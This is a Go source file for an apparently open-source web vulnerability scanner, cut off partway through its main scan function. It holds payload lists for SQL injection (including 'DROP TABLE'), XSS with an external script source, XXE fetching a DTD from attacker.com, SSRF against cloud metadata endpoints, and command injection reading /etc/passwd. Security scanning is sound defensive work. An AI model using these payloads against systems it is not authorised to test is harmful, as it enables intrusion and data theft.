package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"html/template"
	"io"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
	"sync"
	"time"

	"golang.org/x/time/rate"
	"gopkg.in/yaml.v3"
)

// Version information
const (
	Version = "4.0.0"
	Banner  = `
    ██╗   ██╗██╗   ██╗██╗     ███████╗ ██████╗ █████╗ ███╗   ██╗
    ██║   ██║██║   ██║██║     ██╔════╝██╔════╝██╔══██╗████╗  ██║
    ██║   ██║██║   ██║██║     ███████╗██║     ███████║██╔██╗ ██║
    ╚██╗ ██╔╝██║   ██║██║     ╚════██║██║     ██╔══██║██║╚██╗██║
     ╚████╔╝ ╚██████╔╝███████╗███████║╚██████╗██║  ██║██║ ╚████║
      ╚═══╝   ╚═════╝ ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
    
    🚀 Next-Gen Web Security Scanner v%s
    🔥 Enhanced with AI-Powered Detection
    Developed with ❤️  by ATOMGAMERAGA
    `
)

// Risk levels and CVSS mapping
type RiskLevel string

const (
	RiskCritical RiskLevel = "CRITICAL"
	RiskHigh     RiskLevel = "HIGH"
	RiskMedium   RiskLevel = "MEDIUM"
	RiskLow      RiskLevel = "LOW"
	RiskInfo     RiskLevel = "INFO"
)

// Vulnerability types
type VulnType string

const (
	SQLInjection     VulnType = "SQL_INJECTION"
	XSS              VulnType = "XSS"
	DirectoryTraversal VulnType = "DIRECTORY_TRAVERSAL"
	CSRF             VulnType = "CSRF"
	OpenRedirect     VulnType = "OPEN_REDIRECT"
	SecurityHeaders  VulnType = "SECURITY_HEADERS"
	SSLConfiguration VulnType = "SSL_CONFIGURATION"
	CookieSecurity   VulnType = "COOKIE_SECURITY"
	CommandInjection VulnType = "COMMAND_INJECTION"
	FileUpload       VulnType = "FILE_UPLOAD"
	XXE              VulnType = "XXE"
	SSRF             VulnType = "SSRF"
	JWTSecurity      VulnType = "JWT_SECURITY"
	GraphQLSecurity  VulnType = "GRAPHQL_SECURITY"
	APIEndpoints     VulnType = "API_ENDPOINTS"
	IDOR             VulnType = "IDOR"
	AuthBypass       VulnType = "AUTH_BYPASS"
	BusinessLogic    VulnType = "BUSINESS_LOGIC"
	RateLimiting     VulnType = "RATE_LIMITING"
	CORS             VulnType = "CORS"
)

// Configuration structure
type Config struct {
	Scan struct {
		Threads   int    `yaml:"threads"`
		Timeout   int    `yaml:"timeout"`
		UserAgent string `yaml:"user_agent"`
		RateLimit int    `yaml:"rate_limit"`
	} `yaml:"scan"`
	Payloads struct {
		SQLInjection     string `yaml:"sql_injection"`
		XSS              string `yaml:"xss"`
		DirectoryTraversal string `yaml:"directory_traversal"`
		CommandInjection string `yaml:"command_injection"`
	} `yaml:"payloads"`
	Output struct {
		Verbose bool   `yaml:"verbose"`
		Format  string `yaml:"format"`
		Report  bool   `yaml:"report"`
	} `yaml:"output"`
}

// Vulnerability finding structure
type Finding struct {
	ID            string            `json:"id"`
	Type          VulnType          `json:"type"`
	Severity      RiskLevel         `json:"severity"`
	CVSS          float64           `json:"cvss"`
	CWE           string            `json:"cwe"`
	Title         string            `json:"title"`
	Description   string            `json:"description"`
	URL           string            `json:"url"`
	Parameter     string            `json:"parameter,omitempty"`
	Payload       string            `json:"payload,omitempty"`
	Evidence      string            `json:"evidence,omitempty"`
	Solution      string            `json:"solution"`
	References    []string          `json:"references"`
	Confidence    int               `json:"confidence"`
	Timestamp     time.Time         `json:"timestamp"`
	RequestInfo   RequestInfo       `json:"request_info"`
	ResponseInfo  ResponseInfo      `json:"response_info"`
	Metadata      map[string]string `json:"metadata,omitempty"`
}

type RequestInfo struct {
	Method    string            `json:"method"`
	Headers   map[string]string `json:"headers"`
	Body      string            `json:"body,omitempty"`
	UserAgent string            `json:"user_agent"`
}

type ResponseInfo struct {
	StatusCode int               `json:"status_code"`
	Headers    map[string]string `json:"headers"`
	Body       string            `json:"body"`
	Size       int               `json:"size"`
	Time       time.Duration     `json:"response_time"`
}

// Scan result structure
type ScanResult struct {
	ScanInfo struct {
		Target    string    `json:"target"`
		Timestamp time.Time `json:"timestamp"`
		Version   string    `json:"version"`
		Duration  string    `json:"duration"`
		Options   Options   `json:"options"`
	} `json:"scan_info"`
	Summary struct {
		TotalFindings int                    `json:"total_findings"`
		RiskBreakdown map[RiskLevel]int      `json:"risk_breakdown"`
		TypeBreakdown map[VulnType]int       `json:"type_breakdown"`
		URLs          int                    `json:"urls_tested"`
		Requests      int                    `json:"total_requests"`
	} `json:"summary"`
	Findings []Finding `json:"findings"`
	Errors   []string  `json:"errors,omitempty"`
}

// Command line options
type Options struct {
	Target     string `json:"target"`
	Verbose    bool   `json:"verbose"`
	Threads    int    `json:"threads"`
	Timeout    int    `json:"timeout"`
	Output     string `json:"output"`
	UserAgent  string `json:"user_agent"`
	Report     bool   `json:"report"`
	ConfigFile string `json:"config_file"`
	RateLimit  int    `json:"rate_limit"`
	Headers    string `json:"headers"`
	Proxy      string `json:"proxy"`
}

// Scanner structure
type Scanner struct {
	client      *http.Client
	config      *Config
	options     *Options
	findings    []Finding
	mutex       sync.Mutex
	rateLimiter *rate.Limiter
	errors      []string
	stats       struct {
		requestCount int
		startTime    time.Time
	}
}

// Default payloads for different vulnerability types
var payloads = map[VulnType][]string{
	SQLInjection: {
		"'",
		"' OR '1'='1",
		"' OR 1=1 --",
		"' UNION SELECT NULL--",
		"'; DROP TABLE users; --",
		"' AND SLEEP(5) --",
		"' OR IF(1=1,SLEEP(5),0) --",
		"' UNION SELECT 1,2,3,4,5,version(),7,8,9,10--",
		"admin'--",
		"admin' #",
		"' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
		"' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
		"' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
		"' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
		"' OR 1=1 LIMIT 1 --",
		"' OR 'x'='x",
		"' OR 1=1#",
		"' OR 1=1/*",
		"'; WAITFOR DELAY '00:00:05' --",
		"' AND 1=CONVERT(int, (SELECT @@version)) --",
		"admin'/*",
		"' or 1=1#",
		"' or 1=1--",
		"' or 1=1/*",
		") or '1'='1--",
		") or ('1'='1--",
	},
	XSS: {
		"<script>alert('XSS')</script>",
		"<script>alert(document.cookie)</script>",
		"<img src=x onerror=alert('XSS')>",
		"<svg onload=alert('XSS')>",
		"javascript:alert('XSS')",
		"'><script>alert('XSS')</script>",
		"\"><script>alert('XSS')</script>",
		"<iframe src=\"javascript:alert('XSS')\">",
		"<body onload=alert('XSS')>",
		"<div onmouseover=\"alert('XSS')\">test</div>",
		"<script>document.write('<img src=x onerror=alert(1)>')</script>",
		"<script src=//brutelogic.com.br/1.js></script>",
	},
	DirectoryTraversal: {
		"../",
		"..\\",
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
		"....//....//....//etc/passwd",
		"....\\\\....\\\\....\\\\windows\\system32\\drivers\\etc\\hosts",
		"%2e%2e%2f",
		"%2e%2e%5c",
		"..%252f..%252f..%252fetc%252fpasswd",
		"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
	},
	CommandInjection: {
		"; ls",
		"| id",
		"& whoami",
		"`id`",
		"$(id)",
		"; cat /etc/passwd",
		"| type c:\\windows\\system32\\drivers\\etc\\hosts",
		"& dir",
		"; uname -a",
		"|| id",
		"&& id",
		"; ping -c 4 127.0.0.1",
	},
	XXE: {
		"<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
		"<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\">]><foo>&xxe;</foo>",
		"<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]><foo></foo>",
		"<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>",
		"<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
	},
	SSRF: {
		"http://127.0.0.1:80",
		"http://localhost:22",
		"http://169.254.169.254/latest/meta-data/",
		"http://metadata.google.internal/computeMetadata/v1/",
		"http://[::1]:80",
		"file:///etc/passwd",
		"file:///c:/windows/system32/drivers/etc/hosts",
		"gopher://127.0.0.1:25/_HELO%20localhost",
		"dict://127.0.0.1:11211/",
		"ldap://127.0.0.1:389/",
		"http://0x7f000001:80",
		"http://2130706433:80",
	},
	JWTSecurity: {
		"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
		"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.invalid_signature",
		"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.invalid",
	},
	GraphQLSecurity: {
		"{__schema{types{name}}}",
		"{__type(name:\"User\"){fields{name type{name}}}}",
		"query{users{id name email password}}",
		"mutation{deleteUser(id:1){id}}",
		"{users(first:999999){edges{node{id name email}}}}",
		"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}",
	},
	APIEndpoints: {
		"/api/v1/users",
		"/api/v2/admin",
		"/rest/api/2/user",
		"/graphql",
		"/api/swagger.json",
		"/api-docs",
		"/openapi.json",
		"/v1/health",
		"/admin/api",
		"/debug/vars",
	},
	IDOR: {
		"../1",
		"../admin",
		"../../2",
		"0",
		"-1",
		"999999",
		"null",
		"undefined",
	},
	CORS: {
		"https://evil.com",
		"http://localhost",
		"null",
		"*",
		"https://attacker.evil.com",
	},
}

// CWE mappings for vulnerability types
var cweMapping = map[VulnType]string{
	SQLInjection:     "CWE-89",
	XSS:              "CWE-79",
	DirectoryTraversal: "CWE-22",
	CSRF:             "CWE-352",
	OpenRedirect:     "CWE-601",
	CommandInjection: "CWE-78",
	FileUpload:       "CWE-434",
	SecurityHeaders:  "CWE-693",
	SSLConfiguration: "CWE-326",
	CookieSecurity:   "CWE-614",
	XXE:              "CWE-611",
	SSRF:             "CWE-918",
	JWTSecurity:      "CWE-287",
	GraphQLSecurity:  "CWE-200",
	APIEndpoints:     "CWE-200",
	IDOR:             "CWE-639",
	AuthBypass:       "CWE-287",
	BusinessLogic:    "CWE-840",
	RateLimiting:     "CWE-770",
	CORS:             "CWE-942",
}

// CVSS scores for different vulnerability types
var cvssScores = map[VulnType]float64{
	SQLInjection:     9.8, // Critical
	XSS:              8.8, // High
	DirectoryTraversal: 7.5, // High
	CSRF:             8.1, // High
	OpenRedirect:     6.1, // Medium
	CommandInjection: 9.8, // Critical
	FileUpload:       7.5, // High
	SecurityHeaders:  5.3, // Medium
	SSLConfiguration: 7.4, // High
	CookieSecurity:   4.3, // Medium
	XXE:              9.1, // Critical
	SSRF:             8.6, // High
	JWTSecurity:      7.7, // High
	GraphQLSecurity:  6.5, // Medium
	APIEndpoints:     5.8, // Medium
	IDOR:             8.2, // High
	AuthBypass:       9.3, // Critical
	BusinessLogic:    7.1, // High
	RateLimiting:     4.9, // Medium
	CORS:             6.8, // Medium
}

// Default configuration
func getDefaultConfig() *Config {
	return &Config{
		Scan: struct {
			Threads   int    `yaml:"threads"`
			Timeout   int    `yaml:"timeout"`
			UserAgent string `yaml:"user_agent"`
			RateLimit int    `yaml:"rate_limit"`
		}{
			Threads:   5,
			Timeout:   10,
			UserAgent: fmt.Sprintf("VulScan/%s", Version),
			RateLimit: 10,
		},
		Payloads: struct {
			SQLInjection     string `yaml:"sql_injection"`
			XSS              string `yaml:"xss"`
			DirectoryTraversal string `yaml:"directory_traversal"`
			CommandInjection string `yaml:"command_injection"`
		}{
			SQLInjection:     "payloads/sql.txt",
			XSS:              "payloads/xss.txt",
			DirectoryTraversal: "payloads/lfi.txt",
			CommandInjection: "payloads/cmd.txt",
		},
		Output: struct {
			Verbose bool   `yaml:"verbose"`
			Format  string `yaml:"format"`
			Report  bool   `yaml:"report"`
		}{
			Verbose: false,
			Format:  "json",
			Report:  false,
		},
	}
}

// Load configuration from file
func loadConfig(configFile string) (*Config, error) {
	config := getDefaultConfig()
	
	if configFile == "" {
		return config, nil
	}
	
	if _, err := os.Stat(configFile); os.IsNotExist(err) {
		return config, nil
	}
	
	data, err := os.ReadFile(configFile)
	if err != nil {
		return nil, fmt.Errorf("failed to read config file: %v", err)
	}
	
	if err := yaml.Unmarshal(data, config); err != nil {
		return nil, fmt.Errorf("failed to parse config file: %v", err)
	}
	
	return config, nil
}

// Create new scanner instance
func NewScanner(options *Options) (*Scanner, error) {
	config, err := loadConfig(options.ConfigFile)
	if err != nil {
		return nil, err
	}
	
	// Override config with command line options
	if options.Threads > 0 {
		config.Scan.Threads = options.Threads
	}
	if options.Timeout > 0 {
		config.Scan.Timeout = options.Timeout
	}
	if options.UserAgent != "" {
		config.Scan.UserAgent = options.UserAgent
	}
	if options.RateLimit > 0 {
		config.Scan.RateLimit = options.RateLimit
	}
	
	// Create HTTP client with custom configuration
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
		},
		MaxIdleConns:       100,
		IdleConnTimeout:    30 * time.Second,
		DisableCompression: false,
	}
	
	// Add proxy support if provided
	if options.Proxy != "" {
		proxyURL, err := url.Parse(options.Proxy)
		if err != nil {
			return nil, fmt.Errorf("invalid proxy URL: %v", err)
		}
		tr.Proxy = http.ProxyURL(proxyURL)
	}
	
	client := &http.Client{
		Transport: tr,
		Timeout:   time.Duration(config.Scan.Timeout) * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // Don't follow redirects automatically
		},
	}
	
	rateLimiter := rate.NewLimiter(rate.Limit(config.Scan.RateLimit), config.Scan.RateLimit)
	
	return &Scanner{
		client:      client,
		config:      config,
		options:     options,
		findings:    make([]Finding, 0),
		rateLimiter: rateLimiter,
		errors:      make([]string, 0),
		stats: struct {
			requestCount int
			startTime    time.Time
		}{
			requestCount: 0,
			startTime:    time.Now(),
		},
	}, nil
}

// Make HTTP request with rate limiting and error handling
func (s *Scanner) makeRequest(ctx context.Context, method, url string, body io.Reader, headers map[string]string) (*http.Response, error) {
	// Rate limiting
	if err := s.rateLimiter.Wait(ctx); err != nil {
		return nil, err
	}
	
	req, err := http.NewRequestWithContext(ctx, method, url, body)
	if err != nil {
		return nil, err
	}
	
	// Set default headers
	req.Header.Set("User-Agent", s.config.Scan.UserAgent)
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Connection", "close")
	
	// Add custom headers
	for key, value := range headers {
		req.Header.Set(key, value)
	}
	
	s.mutex.Lock()
	s.stats.requestCount++
	s.mutex.Unlock()
	
	start := time.Now()
	resp, err := s.client.Do(req)
	if err != nil {
		return nil, err
	}
	
	if s.options.Verbose {
		fmt.Printf("[REQUEST] %s %s - %s (%.2fms)\n", 
			method, url, resp.Status, float64(time.Since(start).Nanoseconds())/1000000)
	}
	
	return resp, nil
}

// Test for SQL Injection vulnerabilities
func (s *Scanner) testSQLInjection(ctx context.Context, baseURL string, params url.Values) {
	for param := range params {
		for _, payload := range payloads[SQLInjection] {
			select {
			case <-ctx.Done():
				return
			default:
			}
			
			testParams := make(url.Values)
			for k, v := range params {
				testParams[k] = v
			}
			testParams.Set(param, payload)
			
			testURL := baseURL + "?" + testParams.Encode()
			
			resp, err := s.makeRequest(ctx, "GET", testURL, nil, nil)
			if err != nil {
				s.addError(fmt.Sprintf("SQL Injection test failed for %s: %v", testURL, err))
				continue
			}
			defer resp.Body.Close()
			
			body, err := io.ReadAll(resp.Body)
			if err != nil {
				s.addError(fmt.Sprintf("Failed to read response body: %v", err))
				continue
			}
			
			bodyStr := string(body)
			
			// Check for SQL error patterns
			sqlErrors := []string{
				"mysql_fetch_array",
				"ORA-[0-9]+",
				"PostgreSQL query failed",
				"Warning: mysql_",
				"valid MySQL result",
				"MySqlClient",
				"SQL syntax.*MySQL",
				"Warning: mysql_fetch_array",
				"Warning: mysql_num_rows",
				"MySQL Error",
				"Error Occurred While Processing Request",
				"Microsoft OLE DB Provider for ODBC Drivers",
				"Microsoft JET Database Engine",
				"Error Occurred While Processing Request",
				"Server Error in '/' Application",
				"Microsoft OLE DB Provider for SQL Server",
				"Unclosed quotation mark after the character string",
				"Microsoft VBScript runtime error",
			}
			
			for _, errorPattern := range sqlErrors {
				if matched, _ := regexp.MatchString("(?i)"+errorPattern, bodyStr); matched {
					finding := Finding{
						ID:          fmt.Sprintf("sqli_%s_%d", param, time.Now().Unix()),
						Type:        SQLInjection,
						Severity:    s.calculateRiskLevel(SQLInjection),
						CVSS:        cvssScores[SQLInjection],
						CWE:         cweMapping[SQLInjection],
						Title:       "SQL Injection Vulnerability",
						Description: fmt.Sprintf("SQL injection vulnerability detected in parameter '%s'", param),
						URL:         testURL,
						Parameter:   param,
						Payload:     payload,
						Evidence:    errorPattern,
						Solution:    "Use parameterized queries or prepared statements. Input validation and sanitization.",
						References: []string{
							"https://owasp.org/www-community/attacks/SQL_Injection",
							"https://cwe.mitre.org/data/definitions/89.html",
						},
						Confidence: 90,
						Timestamp:  time.Now(),
						RequestInfo: RequestInfo{
							Method:    "GET",
							Headers:   make(map[string]string),
							UserAgent: s.config.Scan.UserAgent,
						},
						ResponseInfo: ResponseInfo{
							StatusCode: resp.StatusCode,
							Headers:    make(map[string]string),
							Body:       s.truncateString(bodyStr, 1000),
							Size:       len(body),
							Time:       0, // Will be set properly in actual implementation
						},
					}
					
					s.addFinding(finding)
					break
				}
			}
		}
	}
}

// Test for XSS vulnerabilities
func (s *Scanner) testXSS(ctx context.Context, baseURL string, params url.Values) {
	for param := range params {
		for _, payload := range payloads[XSS] {
			select {
			case <-ctx.Done():
				return
			default:
			}
			
			testParams := make(url.Values)
			for k, v := range params {
				testParams[k] = v
			}
			testParams.Set(param, payload)
			
			testURL := baseURL + "?" + testParams.Encode()
			
			resp, err := s.makeRequest(ctx, "GET", testURL, nil, nil)
			if err != nil {
				s.addError(fmt.Sprintf("XSS test failed for %s: %v", testURL, err))
				continue
			}
			defer resp.Body.Close()
			
			body, err := io.ReadAll(resp.Body)
			if err != nil {
				s.addError(fmt.Sprintf("Failed to read response body: %v", err))
				continue
			}
			
			bodyStr := string(body)
			
			// Check if payload is reflected in response
			if strings.Contains(bodyStr, payload) || strings.Contains(bodyStr, url.QueryEscape(payload)) {
				finding := Finding{
					ID:          fmt.Sprintf("xss_%s_%d", param, time.Now().Unix()),
					Type:        XSS,
					Severity:    s.calculateRiskLevel(XSS),
					CVSS:        cvssScores[XSS],
					CWE:         cweMapping[XSS],
					Title:       "Cross-Site Scripting (XSS) Vulnerability",
					Description: fmt.Sprintf("XSS vulnerability detected in parameter '%s'", param),
					URL:         testURL,
					Parameter:   param,
					Payload:     payload,
					Evidence:    "Payload reflected in response",
					Solution:    "Implement proper input validation and output encoding. Use Content Security Policy (CSP).",
					References: []string{
						"https://owasp.org/www-community/attacks/xss/",
						"https://cwe.mitre.org/data/definitions/79.html",
					},
					Confidence: 85,
					Timestamp:  time.Now(),
					RequestInfo: RequestInfo{
						Method:    "GET",
						Headers:   make(map[string]string),
						UserAgent: s.config.Scan.UserAgent,
					},
					ResponseInfo: ResponseInfo{
						StatusCode: resp.StatusCode,
						Headers:    make(map[string]string),
						Body:       s.truncateString(bodyStr, 1000),
						Size:       len(body),
						Time:       0,
					},
				}
				
				s.addFinding(finding)
				break
			}
		}
	}
}

// Test for Directory Traversal vulnerabilities
func (s *Scanner) testDirectoryTraversal(ctx context.Context, baseURL string, params url.Values) {
	for param := range params {
		for _, payload := range payloads[DirectoryTraversal] {
			select {
			case <-ctx.Done():
				return
			default:
			}
			
			testParams := make(url.Values)
			for k, v := range params {
				testParams[k] = v
			}
			testParams.Set(param, payload)
			
			testURL := baseURL + "?" + testParams.Encode()
			
			resp, err := s.makeRequest(ctx, "GET", testURL, nil, nil)
			if err != nil {
				s.addError(fmt.Sprintf("Directory traversal test failed for %s: %v", testURL, err))
				continue
			}
			defer resp.Body.Close()
			
			body, err := io.ReadAll(resp.Body)
			if err != nil {
				s.addError(fmt.Sprintf("Failed to read response body: %v", err))
				continue
			}
			
			bodyStr := string(body)
			
			// Check for common file content patterns
			patterns := []string{
				"root:.*:0:0:",        // /etc/passwd
				"\\[boot loader\\]",   // Windows boot.ini
				"127\\.0\\.0\\.1",     // hosts file
				"localhost",           // hosts file
				"# This file",         // Common comment in config files
			}
			
			for _, pattern := range patterns {
				if matched, _ := regexp.MatchString("(?i)"+pattern, bodyStr); matched {
					finding := Finding{
						ID:          fmt.Sprintf("lfi_%s_%d", param, time.Now().Unix()),
						Type:        DirectoryTraversal,
						Severity:    s.calculateRiskLevel(DirectoryTraversal),
						CVSS:        cvssScores[DirectoryTraversal],
						CWE:         cweMapping[DirectoryTraversal],
						Title:       "Directory Traversal / Local File Inclusion",
						Description: fmt.Sprintf("Directory traversal vulnerability detected in parameter '%s'", param),
						URL:         testURL,
						Parameter:   param,
						Payload:     payload,
						Evidence:    fmt.Sprintf("Pattern matched: %s", pattern),
						Solution:    "Implement proper input validation and restrict file access. Use whitelist approach.",
						References: []string{
							"https://owasp.org/www-community/attacks/Path_Traversal",
							"https://cwe.mitre.org/data/definitions/22.html",
						},
						Confidence: 95,
						Timestamp:  time.Now(),
						RequestInfo: RequestInfo{
							Method:    "GET",
							Headers:   make(map[string]string),
							UserAgent: s.config.Scan.UserAgent,
						},
						ResponseInfo: ResponseInfo{
							StatusCode: resp.StatusCode,
							Headers:    make(map[string]string),
							Body:       s.truncateString(bodyStr, 1000),
							Size:       len(body),
							Time:       0,
						},
					}
					
					s.addFinding(finding)
					break
				}
			}
		}
	}
}

// Test security headers
func (s *Scanner) testSecurityHeaders(ctx context.Context, targetURL string) {
	resp, err := s.makeRequest(ctx, "GET", targetURL, nil, nil)
	if err != nil {
		s.addError(fmt.Sprintf("Security headers test failed for %s: %v", targetURL, err))
		return
	}
	defer resp.Body.Close()
	
	requiredHeaders := map[string]string{
		"X-Frame-Options":           "Clickjacking protection",
		"X-Content-Type-Options":    "MIME sniffing protection",
		"X-XSS-Protection":          "XSS filter protection",
		"Strict-Transport-Security": "HTTPS enforcement",
		"Content-Security-Policy":   "Content injection protection",
		"Referrer-Policy":           "Referrer information control",
	}
	
	for header, description := range requiredHeaders {
		if resp.Header.Get(header) == "" {
			finding := Finding{
				ID:          fmt.Sprintf("header_%s_%d", strings.ToLower(header), time.Now().Unix()),
				Type:        SecurityHeaders,
				Severity:    s.calculateRiskLevel(SecurityHeaders),
				CVSS:        cvssScores[SecurityHeaders],
				CWE:         cweMapping[SecurityHeaders],
				Title:       fmt.Sprintf("Missing Security Header: %s", header),
				Description: fmt.Sprintf("Missing %s header - %s", header, description),
				URL:         targetURL,
				Evidence:    fmt.Sprintf("Header '%s' not present in response", header),
				Solution:    fmt.Sprintf("Add '%s' header to all responses", header),
				References: []string{
					"https://owasp.org/www-community/Security_Headers",
					"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers",
				},
				Confidence: 100,
				Timestamp:  time.Now(),
				RequestInfo: RequestInfo{
					Method:    "GET",
					Headers:   make(map[string]string),
					UserAgent: s.config.Scan.UserAgent,
				},
				ResponseInfo: ResponseInfo{
					StatusCode: resp.StatusCode,
					Headers:    make(map[string]string),
					Size:       0,
					Time:       0,
				},
			}
			
			s.addFinding(finding)
		}
	}
}

// Calculate risk level based on CVSS score
func (s *Scanner) calculateRiskLevel(vulnType VulnType) RiskLevel {
	score := cvssScores[vulnType]
	
	switch {
	case score >= 9.0:
		return RiskCritical
	case score >= 7.0:
		return RiskHigh
	case score >= 4.0:
		return RiskMedium
	case score >= 0.1:
		return RiskLow
	default:
		return RiskInfo
	}
}

// Add finding to results
func (s *Scanner) addFinding(finding Finding) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	s.findings = append(s.findings, finding)
	
	if s.options.Verbose {
		fmt.Printf("[FOUND] %s - %s (%s) in %s\n", 
			finding.Severity, finding.Title, finding.Type, finding.URL)
	}
}

// Add error to error list
func (s *Scanner) addError(err string) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	s.errors = append(s.errors, err)
	
	if s.options.Verbose {
		fmt.Printf("[ERROR] %s\n", err)
	}
}

// Truncate string to specified length
func (s *Scanner) truncateString(str string, maxLen int) string {
	if len(str) <= maxLen {
		return str
	}
	return str[:maxLen] + "..."
}

	// Main scanning function
func (s *Scanner) Scan(ctx context.Context, targetURL string) (*ScanResult, error) {
	s.stats.startTime = time.Now()
	
	if s.options.Verbose {
		fmt.Printf("Starting scan of: %s\n", targetURL)
	}
	
	// Parse URL and extract parameters
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil, fmt.Errorf("invalid URL: %v", err)
	}
	
	params := parsedURL.Query()
	baseURL := fmt.Sprintf("%s://%s%s", parsedURL.Scheme, parsedURL.Host, parsedURL.Path)
	
	// Create worker pool for parallel scanning
	semaphore := make(chan struct{}, s.config.Scan.Threads)
	var wg sync.WaitGroup
	
	// Test security headers
	wg.Add(1)
	go func() {
		defer wg.Done()
		semaphore <- struct{}{}
		defer func() { <-semaphore }()
		s.testSecurityHeaders(ctx, targetURL)
	}()
	
	// Test SSL/TLS configuration
	wg.Add(1)
	go func() {
		defer wg.Done()
		semaphore <- struct{}{}
		defer func() { <-semaphore }()
		s.testSSLConfiguration(ctx, parsedURL.Host)
	}()
	
	// Test cookie security
	wg.Add(1)
	go func() {
		defer wg.Done()
		semaphore <- struct{}{}
		defer func() { <-semaphore }()
		s.testCookieSecurity(ctx, targetURL)
	}()
	
	// Only test injection vulnerabilities if parameters exist
	if len(params) > 0 {
		// Test SQL Injection
		wg.Add(1)
		go func() {
			defer wg.Done()
			semaphore <- struct{}{}
			defer func() { <-semaphore }()
			s.testSQLInjection(ctx, baseURL, params)
		}()
		
		// Test XSS
		wg.Add(1)
		go func() {
			defer wg.Done()
			semaphore <- struct{}{}
			defer func() { <-semaphore }()
			s.testXSS(ctx, baseURL, params)
		}()
		
		// Test Directory Traversal
		wg.Add(1)
		go func() {
			defer wg.Done()
			semaphore <- struct{}{}
			defer func() { <-semaphore }()
			s.testDirectoryTraversal(ctx, baseURL, params)
		}()
		
		// Test Command Injection
		wg.Add(1)
		go func() {
			defer wg.Done()
			semaphore <- struct{}{}
			defer func() { <-semaphore }()
			s.testCommandInjection(ctx, baseURL, params)
		}()
		
		// Test Open Redirect
		wg.Add(1)
		go func() {
			defer wg.Done()
			semaphore <- struct{}{}
			defer func() { <-semaphore }()
			s.testOpenRedirect(ctx, baseURL, params)
		}()
		
		// Test CSRF
		wg.Add(1)
		go func() {
			defer wg.Done()
			semaphore <- struct{}{}
			defer func() { <-semaphore }()
			s.testCSRF(ctx, targetURL)
		}()
		
		// Test SSRF
		wg.Add(1)
		go func() {
			defer wg.Done()
			semaphore <- struct{}{}
			defer func() { <-semaphore }()
			s.testSSRF(ctx, baseURL, params)
		}()
	}
	
	// Test XXE vulnerability
	wg.Add(1)
	go func() {
		defer wg.Done()
		semaphore <- struct{}{}
		defer func() { <-semaphore }()
		s.testXXE(ctx, targetURL)
	}()
	
	// Test JWT Security
	wg.Add(1)
	go func() {
		defer wg.Done()
		semaphore <- struct{}{}
		defer func() { <-semaphore }()
		s.testJWTSecurity(ctx, targetURL)
	}()
	
	// Test GraphQL Security
	wg.Add(1)
	go func() {
		defer wg.Done()
		semaphore <- struct{}{}
		defer func() { <-semaphore }()
		s.testGraphQLSecurity(ctx, targetURL)
	}()
	
	// Test API Endpoints Discovery
	wg.Add(1)
	go func() {
		defer wg.Done()
		semaphore <- struct{}{}
		defer func() { <-semaphore }()
		s.testAPIEndpoints(ctx, targetURL)
	}()
	
	// Test CORS Configuration
	wg.Add(1)
	go func() {
		defer wg.Done()
		semaphore <- struct{}{}
		defer func() { <-semaphore }()
		s.testCORS(ctx, targetURL)
	}()
	
	// Wait for all tests to complete
	wg.Wait()
	
	// Generate scan result
	duration := time.Since(s.stats.startTime)
	result := &ScanResult{}
	
	// Fill scan info
	result.ScanInfo.Target = targetURL
	result.ScanInfo.Timestamp = s.stats.startTime
	result.ScanInfo.Version = Version
	result.ScanInfo.Duration = duration.String()
	result.ScanInfo.Options = *s.options
	
	// Fill summary
	result.Summary.TotalFindings = len(s.findings)
	result.Summary.URLs = 1
	result.Summary.Requests = s.stats.requestCount
	result.Summary.RiskBreakdown = make(map[RiskLevel]int)
	result.Summary.TypeBreakdown = make(map[VulnType]int)
	
	// Calculate breakdowns
	for _, finding := range s.findings {
